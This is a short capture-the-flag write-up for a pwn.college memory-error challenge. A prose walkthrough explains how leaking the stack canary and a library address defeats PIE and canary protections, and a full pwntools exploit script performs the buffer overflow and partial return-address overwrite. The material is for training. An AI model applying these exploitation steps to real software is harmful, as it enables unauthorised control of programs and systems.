So now we have a Pie binary, and a canary
Checking the binary, a convenient backdoor is prepared for us to leak the canary, and anything in between our canary and the designated return address
![](img/Recursive%20Ruin%20Hard-1779949947818.webp)
Using pwndbg, we can inspect to get the location of the return address
Before repeat:
![](img/Recursive%20Ruin%20Hard-1779950140387.webp)
After repeat:
![](img/Recursive%20Ruin%20Hard-1779950148569.webp)
Checking the 3rd entry we can conclude that its the return address
The 2nd address is a library address (because of weird paging relative to main), which we need to not break during the operation
That leave us with 2 things to leak: the lib addr, and canary
```
#!/usr/bin/python3
from pwn import *
import re
import sys
import time

context.log_level="debug"

while True:
    p=process("/home/thtad/Desktop/pwncollege/mem_error/recursive-ruin/recursive-ruin-hard")

    payload=b"REPEAT"+b"A"*(0x90-0x7-0x6)

    p.recvuntil("Payload size:")
    p.sendline(str(0x90-0x7).encode())
    p.recvuntil("bytes)!")
    p.send(payload)

    zz = p.recvuntil(b"Backdoor")
    dat=zz.split(b"You said: ",1)[1]
    dat=dat[len(payload):]
    canary=b"\x00"+dat[:7]

    payload=b"REPEAT"+b"A"*(0x90-0x6)

    p.recvuntil("Payload size:")
    p.sendline(str(0x90).encode())
    p.recvuntil("bytes)!")
    p.send(payload)

    zz = p.recvuntil(b"Backdoor")
    dat=zz.split(b"You said: ",1)[1]
    dat=dat[len(payload):]
    addr=dat[:6]

    payload=b"A"*(0x90-0x8) + canary + addr + b"\x00\x00" + b"\xb0\x61"
    print(payload)

    p.recvuntil("Payload size:")
    p.sendline(str(0x90+0x8+0x2).encode())
    p.recvuntil("bytes)!")
    p.send(payload) 

    try:
        p.recvuntil(b'flag', timeout=1.5)
        break
    except:
        pass
    try:
        p.close()
    except: pass
```